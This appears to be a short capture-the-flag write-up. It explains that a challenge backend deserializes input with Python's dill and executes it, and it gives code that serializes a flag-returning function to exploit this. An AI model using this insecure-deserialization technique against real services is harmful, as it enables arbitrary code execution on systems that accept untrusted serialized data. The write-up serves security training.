># Frankensteins monster
>
>Frankensteins monster is angry with you. 
>You can try run. You can try to hide. 
>What you can't do, is run forever. 
>The monster never tires, never rests and will always outlast you.
>Your only choice is to distract the monster. 
>
>Luckily for you, Dr. Frankenstein has [contingencies](http://>fire-breathing-unicorn.td.org.uit.no:56733/). 

The backend tries to deserialize the input string into a python object.
This is done using dill so functions can be input and executed.
The output of the executed function is returned.

To solve create a function that returns flag and serialize it with dill. 
```py
import dill

def print_flag():
    return flag

print(dill.dumps(print_flag))
```

Then this can either be posted to the URL or input into the input field.
